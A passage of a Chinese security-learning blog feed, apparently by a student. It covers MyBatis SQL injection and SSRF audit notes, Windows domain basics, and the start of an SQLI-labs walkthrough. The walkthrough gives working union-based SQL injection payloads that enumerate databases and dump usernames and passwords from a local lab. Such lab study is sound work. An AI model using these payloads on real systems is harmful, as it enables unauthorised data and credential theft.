open=<span class="string">&quot;(&quot;</span> separator=<span class="string">&quot;,&quot;</span> close=<span class="string">&quot;)&quot;</span>&gt;</span><br><span class="line">        #&#123;id&#125;</span><br><span class="line">    &lt;/foreach&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;foreach&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 标签用于遍历一个集合，把集合里的元素插入到 SQL 语句中</font><ul><li><code>item</code>临时变量名、<code>collection</code>需遍历的集合名</li><li><code>open</code>、<code>close</code>指定在遍历开始和结束前插入的值、<code>separator</code>分隔符</li></ul></li><li>最终执行<code>SELECT * FROM news WHERE id IN (1, 2, 3)</code><ul><li>假设 ids 集合是<code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;[1, 2, 3]&lt;/font&gt;</code></li></ul></li><li><strong><font style="color:#DF2A3F;">（使用了多个占位符）</font></strong></li></ul><h4 id="Like-查询"><a href="#Like-查询" class="headerlink" title="Like 查询"></a>Like 查询</h4><ul><li>like 模糊查询（多使用前缀查询可以提高效率）</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="keyword">select</span> id<span class="operator">=</span>&quot;searchNews&quot; resultType<span class="operator">=</span>&quot;News&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> news <span class="keyword">WHERE</span> title <span class="keyword">LIKE</span> <span class="string">&#x27;%#&#123;name&#125;%&#x27;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">select</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><ul><li>实际执行的 sql 应该是<ul><li><code>SELECT * FROM news WHERE title LIKE &#39;%?%&#39;</code></li></ul></li><li>假设传参<code>test</code>，由于用了预编译，实际执行<ul><li><code>SELECT * FROM news WHERE title LIKE &#39;%&#39;test&#39;%&#39;</code></li><li>这里直接语法错误了，会**<font style="color:#DF2A3F;">报错</font>**<ul><li>若用<code>$&#123;&#125;</code>直接拼接，不会报错，但是会存在 sql 注入风险</li><li><code>SELECT * FROM news WHERE title LIKE &#39;%test%&#39;</code></li></ul></li></ul></li><li>正确方式：使用<code>concat</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="keyword">select</span> id<span class="operator">=</span>&quot;searchNews&quot; resultType<span class="operator">=</span>&quot;News&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> news <span class="keyword">WHERE</span> title <span class="keyword">LIKE</span> CONCAT(<span class="string">&#x27;%&#x27;</span>, #&#123;name&#125;, <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">select</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><ul><li>生成 sql 如下<ul><li><code>SELECT * FROM news WHERE title LIKE CONCAT(&#39;%&#39;, ?, &#39;%&#39;)</code></li></ul></li><li>假设传参<code>test</code>，由于预编译，虽然被加上单引号，但是因为 concat 机制，不会报错<ul><li><code>SELECT * FROM news WHERE title LIKE CONCAT(&#39;%&#39;, &#39;test&#39;, &#39;%&#39;)</code></li></ul></li></ul><h4 id="order-by-查询"><a href="#order-by-查询" class="headerlink" title="order by 查询"></a>order by 查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="keyword">select</span> id<span class="operator">=</span>&quot;selectTest&quot; resultType<span class="operator">=</span>&quot;Test&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test <span class="keyword">ORDER</span> <span class="keyword">BY</span> #&#123;columnName&#125;</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">select</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><ul><li>执行查询语句<ul><li><code>SELECT * FROM test ORDER BY &#39;?&#39;</code></li></ul></li><li>假设传参<code>age</code><ul><li><code>SELECT * FROM test ORDER BY &#39;age&#39;</code></li></ul></li><li>问题：这里是一个字符串<code>&#39;age&#39;</code>，非列名，会报错<ul><li>若直接用<code>$&#123;&#125;</code>拼接，不会报错，但是存在 sql 注入风险</li><li><code>SELECT * FROM test ORDER BY age</code></li></ul></li><li>解决：应该使用<code>$&#123;&#125;</code>但是需要作控制<ul><li>1：转义</li><li>2：白名单</li></ul></li></ul><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><a href="https://www.viewofthai.link/2023/11/01/ssrf-%E6%80%BB%E7%BB%93/">ssrf总结好文</a></p><ul><li>java 中 SSRF 的利用受限，不如 PHP 灵活（可以使用多种伪协议）<ul><li><code>ftp/file</code>上传下载文件、<code>http(s)</code>攻击内网 Web 应用</li><li>在 SSRF 中利用<code>jar</code>协议配合类加载漏洞实现 RCE<ul><li>1：利用 SSRF 访问远程服务器中的恶意 jar 文件</li><li>2：若目标应用存在类加载漏洞<code>URLClassLoader</code>，可 RCE</li></ul></li></ul></li></ul><h3 id="java-中网络请求类"><a href="#java-中网络请求类" class="headerlink" title="java 中网络请求类"></a>java 中网络请求类</h3><p>网络请求有很多：主要是含 http 、url、uri 的类</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br><span class="line">HttpServletRequest</span><br><span class="line">getParameter</span><br><span class="line">URI</span><br><span class="line">URL</span><br><span class="line">HttpClient</span><br><span class="line">HttpServletRequest</span><br><span class="line">HttpURLConnection</span><br><span class="line">URLConnection</span><br><span class="line">okhttp</span><br><span class="line">BasicHttpEntityEnclosingRequest</span><br><span class="line">DafauleBHttpClientConnection</span><br><span class="line">BasicHttpRequest</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>java 支持的协议<code>File、ftp、mailto、http、https、jar、netdoc</code><ul><li>含有 http 的类<code>HttpURLConnection、HttpClient、Request、okhttp</code>只支持 http</li><li>其他支持 java 支持的所有协议</li></ul></li></ul><h3 id="SSRF-判断"><a href="#SSRF-判断" class="headerlink" title="SSRF 判断"></a>SSRF 判断</h3><ul><li>人工主要判断两个<ul><li>1：网络请求的服务器可控</li><li>2：没有做过滤：协议控制、ip 白名单、域名白名单、路径白名单、返回信息过滤、内网 ip 黑名单</li></ul></li><li>自动化检测工具思路<ul><li>1 遍历语法树找到调用点、污点数据流追踪<ul><li>（通过危险方法列表）</li></ul></li><li>2 误报抑制：忽略白名单校验、安全过滤</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/217dd0ea5c88939f1bfd6e7b7a7092ef.png"></p><h3 id="SSRF-防御"><a href="#SSRF-防御" class="headerlink" title="SSRF 防御"></a>SSRF 防御</h3><ul><li><strong>通用防御方法</strong>：<ul><li>协议白名单、ip 白名单、域名白名单、路径白名单、返回信息过滤、内网 ip 黑名单</li><li>正则匹配：严格控制 URL 格式，避免<code>@</code>和<code>#</code>绕过</li><li>严格控制出站流量</li></ul></li></ul><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><ul><li>其实主要就是看怎么做的鉴权<ul><li>1：直接用 id 查询</li><li>2：用统一身份认证</li></ul></li></ul>]]></content>
    
    
    <summary type="html">---categories: Java白盒---在某 logo 是黑色的一线潮流平台实习中遇到的：企业中一般常见的漏洞：sql、越权、ssrf、未授权、硬编码 key 等/动态加载脚本（反序列化较少）在公司审计的代码就不便上传了，用一些网上能找到的例子学习举例sqlsql 注入的防御核心手段—...</summary>
    
    
    
    <category term="Java白盒" scheme="http://godice.top/categories/Java%E7%99%BD%E7%9B%92/"/>
    
    
  </entry>
  
  <entry>
    <title>内网基础知识</title>
    <link href="http://godice.top/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html"/>
    <id>http://godice.top/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</id>
    <published>2025-02-21T08:13:11.000Z</published>
    <updated>2025-04-04T10:47:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内网最最基础"><a href="#内网最最基础" class="headerlink" title="内网最最基础"></a>内网最最基础</h2><p><a href="https://www.freebuf.com/articles/network/317424.html">学习文档参考</a></p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><h4 id="工作组概念"><a href="#工作组概念" class="headerlink" title="工作组概念"></a>工作组概念</h4><ul><li>对局域网内不同的电脑按照功能（部分）进行分组</li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/5ac86d33a394993d6a0359b23fcdf14e.png"></p><h4 id="win11加退工作组"><a href="#win11加退工作组" class="headerlink" title="win11加退工作组"></a>win11加退工作组</h4><ul><li>右键我的电脑-属性-域或工作组<ul><li>如果输入的名称在当前局域网没有，相当于创建了一个新的工作组</li><li>退出工作组，只需要改名即可</li><li>（工作组中的计算机是对等的）</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/14fdd5e043e63cf2252cc01c64e68b98.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/4680fb8c830d9f17dd3608807ed439d8.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/8b87f49f51778f0e77249b724b5ab821.png"></p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><h4 id="域基础概念"><a href="#域基础概念" class="headerlink" title="域基础概念"></a>域基础概念</h4><p>SAM 数据库<font style="color:rgba(0, 0, 0, 0.85);">即 Security Accounts Manager 数据库，是 Windows 操作系统中用于存储本地用户账户和组账户信息的重要组件</font></p><p><font style="color:rgba(0, 0, 0, 0.85);"></font></p><p><font style="color:rgba(0, 0, 0, 0.85);"></font></p><ul><li>域：有安全边界的计算机集合（两个域之间的资源无法互相访问）<ul><li>访问域资源：必须有合法身份登录该域</li><li>在域中的资源权限：取决于你在域中的身份</li></ul></li><li>域控（DC）：审核域内电脑之间的互相访问<ul><li>域控中存在数据库含：域的账号&#x2F;密码、属于本域的计算机信息<ul><li>域内所有用来验证身份的账号和密码的 散列值都保存在域控制器中</li></ul></li><li>计算机连接到域的控制：<ul><li>检查计算机是否属于本域、用户使用的账户&#x2F;密码是否正确</li></ul></li></ul></li></ul><h4 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h4><ul><li><strong>单域</strong>：固定地理位置的小公司，一般一个域就可以<ul><li>一个域一般至少两个域服务器：DC、备份 DC<ul><li>否则 DC 瘫痪后所有域内其他用户都不能登录</li></ul></li></ul></li><li><strong>父域和子域</strong>：网络中划分多个域，第一个域为父域，其他为子域（父子域是相对的）<ul><li>优点：占用带宽变少、便于管理和交流、方便单独制定域安全策略</li></ul></li><li><strong>域树</strong>：多个域通过建立信任关系组成的集合<ul><li>（域管理员只能管理本域内部，两个域互访需建立信任关系）</li><li>树域内的：父域和子域可以按需管理、跨网分配资源（文件、打印机）</li><li>子域是相对父域来说的，指域名中的每一个段<ul><li>各子域之间用点号隔开，一个”.”代表一个层次</li><li>放在域名最后的子域称为最高级子域或一级域，它前面的子域称为二级域</li><li>子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的</li></ul></li><li>举例：<ul><li><code>abc.com</code>（一个层次）是<code>asia.abc.com</code>（两个层次）的父域</li><li><code>cn.asia.abc.com</code>的级别比域<code>abc.cm</code>低，<code>asia.abc.com</code>是<code>cn.asia.abc.com</code>的父域</li></ul></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/5b5a47700f15f7a982e16d81c253147b.png"></p><ul><li><strong>域森林</strong>：若干个域树通过建立信任关系组成<ul><li>场景：某公司使用域树 <code>abc.com</code>兼并了一个公司域树<code>abc.net</code>，他们无法相互挂载</li><li>这两个域树就可以通过建立信任关系，组成域森林<ul><li>通过域树之间建立的信任关系来管理和使用整个森林中的资源</li><li>（又保持了原有特性）</li></ul></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/b01f0b815286f40ce415d746a666aa9f.png"></p><ul><li><strong>域名服务器</strong>：进行域名 ip 转换的服务器<ul><li>域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字</li><li>因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务</li></ul></li><li><strong>定位 DC</strong>：<ul><li>因此内网渗透一般通过寻找 DNS 服务器来定位 DC</li><li>（DNS 服务器和 DC 一般处于同一台服务器上）</li></ul></li></ul><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><h2 id="域环境知识点"><a href="#域环境知识点" class="headerlink" title="域环境知识点"></a>域环境知识点</h2>]]></content>
    
    
    <summary type="html">---categories: 安全基础---内网最最基础学习文档参考工作组工作组概念对局域网内不同的电脑按照功能（部分）进行分组win11加退工作组右键我的电脑-属性-域或工作组如果输入的名称在当前局域网没有，相当于创建了一个新的工作组退出工作组，只需要改名即可（工作组中的计算机是对等的）域域...</summary>
    
    
    
    <category term="安全基础" scheme="http://godice.top/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>1——65关 SQLI-labs全部通关记录（终极详细）</title>
    <link href="http://godice.top/1%E2%80%94%E2%80%9465%E5%85%B3%20SQLI-labs%E5%85%A8%E9%83%A8%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95%EF%BC%88%E7%BB%88%E6%9E%81%E8%AF%A6%E7%BB%86%EF%BC%89.html"/>
    <id>http://godice.top/1%E2%80%94%E2%80%9465%E5%85%B3%20SQLI-labs%E5%85%A8%E9%83%A8%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95%EF%BC%88%E7%BB%88%E6%9E%81%E8%AF%A6%E7%BB%86%EF%BC%89.html</id>
    <published>2025-01-08T03:24:01.000Z</published>
    <updated>2025-02-23T11:47:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-安装和配置"><a href="#0-安装和配置" class="headerlink" title="0 安装和配置"></a>0 安装和配置</h2><p>1 注意 php5xxx</p><p>2 修改数据库配置文件：user、pass</p><p>3 注意打开网页根目录下，setup 初始化数据库</p><p>4 修改系统环境变量</p><p>本地访问目录<code>[http://127.0.0.1/sql/Less-1/?id=1](http://127.0.0.1/sql/Less-1/?id=1)</code></p><p><a href="https://www.sqlsec.com/2020/05/sqlilabs.html#%E5%AE%89%E8%A3%85">sql：1——65关通关参考文档（含sqlmap）</a></p><p><a href="https://blog.csdn.net/weixin_51143375/article/details/121111169">1——23关，含较多讲解的参考版本</a></p><p><a href="https://tari.moe/2022/sqli-labs.html#8995a61341df41e0bd678c15c61ddaca">1——65关，注重原理的讲解</a></p><p><a href="https://www.bilibili.com/video/BV1e441127Rd/?spm_id_from=333.999.0.0">1——10关b站参考视频</a></p><h2 id="配置总结"><a href="#配置总结" class="headerlink" title="配置总结"></a>配置总结</h2><p>数据库账户密码配置<code>sql/sql-connections/db-creds.inc</code>里面可以配置数据库账户密码</p><p>本地命令行登录数据库（Windows）<code>mysql -uroot -pmima</code></p><h2 id="Mysql-常用操作"><a href="#Mysql-常用操作" class="headerlink" title="Mysql 常用操作"></a>Mysql 常用操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一起默写一下SQL注入的核心语句吧，巩固记忆，方便后续注入的使用</span><br><span class="line">information_schema</span><br><span class="line">schemata(schema_name)</span><br><span class="line">tables(table_schema,table_name)</span><br><span class="line">columns(table_schema,table_name,column_name)</span><br><span class="line">select schema_name from information_schema.schemata;</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;;</span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;;</span><br><span class="line">select concat(username,password) from dvwa.users;</span><br></pre></td></tr></table></figure><p>测试报错<code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&quot;0,\&quot;),\&quot;,))&#39;\&quot;&quot;&lt;/font&gt;</code></p><p>查表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查库：select schema_name from information_schema.schemata;</span><br><span class="line">查表：select table_name from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>;</span><br><span class="line">查列：select column_name from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>;（关键字有哪些）</span><br><span class="line">查字段：select username,password from security.users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/130bcb8ccb0db47d1a98af51393ac045.png"></p><p>常用函数</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> system_user();  // 连接到数据库的用户身份 root@localhost </span><br><span class="line"><span class="built_in">select</span> user();  // </span><br><span class="line"><span class="built_in">select</span> current_user();</span><br><span class="line"><span class="built_in">select</span> database(); 当前使用的数据库</span><br><span class="line"><span class="built_in">select</span> version(); 版本信息</span><br><span class="line"><span class="built_in">select</span> <span class="selector-tag">@</span>@datadir; mysql数据存储路径——上一级目录有数据库配置文件</span><br><span class="line"><span class="built_in">select</span> <span class="selector-tag">@</span>@version_compile_os; 当前系统版本</span><br></pre></td></tr></table></figure><p>联合查询出数据库信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查库名：联合查询，拼接每一行后，用一行返回信息</span><br><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata;--+</span></span><br><span class="line"><span class="string">查表名：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span>;<span class="literal">--</span>+</span><br></pre></td></tr></table></figure><h2 id="基础挑战-1-20"><a href="#基础挑战-1-20" class="headerlink" title="基础挑战 1-20"></a>基础挑战 1-20</h2><h3 id="L1-报错-函数-联合注入"><a href="#L1-报错-函数-联合注入" class="headerlink" title="L1 报错&#x2F;函数&#x2F;联合注入"></a>L1 报错&#x2F;函数&#x2F;联合注入</h3><ul><li>注意：id 值可能为 <code>int</code>&#x2F;<code>varchar</code>这个是在数据库定义的<ul><li>报错的类型不是指的 id 类型，是指我们输入的数据被当作类型</li><li>（这个是写在后端的）</li><li>有单引号，字符型</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/d5689edb929170790428f3f88cfe63d1.png"></p><h4 id="联合查询总结"><a href="#联合查询总结" class="headerlink" title="联合查询总结"></a>联合查询总结</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">记得把联合查询后面：所有的有<span class="string">&#x27;单引号的地方——删除单引号、编码为hex、前面加上0x</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> 如果报错了，则有注入</span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; order by 3--+ 二分法，查看有多少列，当报错说明列数大了，直到不报错为止(小于等于列数，就不会报错)</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;<span class="literal">--</span>+ 看哪些列有回显，这里是<span class="number">23</span>列</span><br><span class="line">注意用作返回信息的列的返回数据类型，需要与对应数据库中列的默认数据类型相同（但是用户名密码一般都是字符型，不存在）</span><br><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata;--+ 查看有哪些数据库</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span>;<span class="literal">--</span>+ 查看security中所有表，注意：table_schema容易打错</span><br><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;;--+ 查看security中users表中的所有字段</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(concat_ws(<span class="string">&#x27;:&#x27;</span>,username,password)) from security.users;<span class="literal">--</span>+ 查security数据库中users表中的username和password字段的值</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/10185070a790f484c7c10a37c04379aa.png"></p><h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959">L1参考文档</a></p><p> 查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> * from users;  // 找出users表中所有数据</span><br><span class="line"><span class="built_in">select</span> * from users limit <span class="number">0</span>,<span class="number">1</span>;  // 从users表第<span class="number">0</span>行开始，共显示<span class="number">1</span>行</span><br><span class="line"><span class="built_in">select</span> * from users limit <span class="number">2</span>,<span class="number">4</span>;  // 从users表第<span class="number">2</span>行开始，共显示<span class="number">4</span>行</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/327f125e0c40b773f66571410f1506e1.png"></p><p>判断报错：无论数字&#x2F;字符型都可以用单引号判断报错 ‘      &amp;&amp;还可以用判断语句判断注入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这个时候</span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;  // 报错</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> or <span class="number">1</span>=<span class="number">1</span>  // 报错</span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1  // 报错</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(特别注意：or 和 and 的前后必须有空格，不然会报错；等于号的前后无所谓)</span></span><br><span class="line"><span class="string">// 以下两种都不报错</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> or <span class="number">1</span>=<span class="number">1</span><span class="literal">--</span>+</span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1--+</span></span><br></pre></td></tr></table></figure><p>排序查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> * from users order by <span class="number">2</span>;  // 按照第二列排序</span><br><span class="line">//可以以此判断，一共有多少列</span><br><span class="line"><span class="built_in">select</span> * from users order by <span class="number">4</span>;  // 这里直接报错，因为只有<span class="number">3</span>列（平时可以用<span class="number">2</span>分法）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1729771545177-0bc7b416-e98d-40c1-9467-0b153d3b6d39.png"></p><p>联合注入</p><p>联合注入：sql 有回显的地方（把本身的回显屏蔽了，然后查询自己想要的内容）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3-- &#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/7f8a649054f96560b8735861af39634f.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/da406271a159f96925c7ec4a9906a7cb.png">还是显示的原来查询的东西，这个时候需要屏蔽他，</p><p>才能得到我们想要的回显</p><p>改为 -1 即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,3--+  // 这个语句在mysql中需要手工再加一个;因为本来的分号被屏蔽了</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span><span class="literal">-1</span><span class="string">&#x27; union select 1,2,3-- &#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 上面虽然能注入成功，但是为了保险还是最好加个;</span><br><span class="line">// 所以注入的时候</span><br><span class="line"><span class="built_in">SELECT</span> * FROM users <span class="built_in">WHERE</span> id=<span class="string">&#x27;-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;<span class="literal">--</span> <span class="string">&#x27; LIMIT 0,1;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/dbc5963e2484561528895096064aecdc.png"><img src="https://raw.githubusercontent.com/godicee/img/main/32b99ffa6601f71d49ff45ac79e0bb20.png"></p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>mysql 常用函数</p><p>显示当前用户的函数：</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/d6780dcb0213291774227bcae2759a16.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> system_user();  // 连接到数据库的用户身份 root@localhost </span><br><span class="line"><span class="built_in">select</span> user();  // </span><br><span class="line"><span class="built_in">select</span> current_user();</span><br></pre></td></tr></table></figure><p>数据库和系统信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> database(); 当前使用的数据库</span><br><span class="line"><span class="built_in">select</span> version(); 版本信息</span><br><span class="line"><span class="built_in">select</span> <span class="selector-tag">@</span>@datadir; mysql数据存储路径——上一级目录有数据库配置文件</span><br><span class="line"><span class="built_in">select</span> <span class="selector-tag">@</span>@version_compile_os; 当前系统版本</span><br></pre></td></tr></table></figure><h4 id="联合查询的使用"><a href="#联合查询的使用" class="headerlink" title="联合查询的使用"></a>联合查询的使用</h4><p>0 已经用 order by 查出数据库列数，联合查询的 1 ，2，3 数量应和列数相同，且在最后一个位置（3）查数据</p><p>1 注意，查询位置的类型，应该和该列的默认数据类型相同</p><p>2 首先用 union select 1，2，3 判断回显信息的位置</p><p>3 然后利用回显的位置查询库、表、用户…</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,3;--+  在2，3位置有回显，</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/86bd671cb112e956094b67a83525ac13.png"></p><p>查库</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,schema_name from information_schema.schemata,3;--+</span></span><br><span class="line"><span class="string">可以看到，这里只能显示一行，通过limit 0,1逐步增加第二个可以得到数据</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/586b948dab71bf5fd342469f9b9f9a62.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 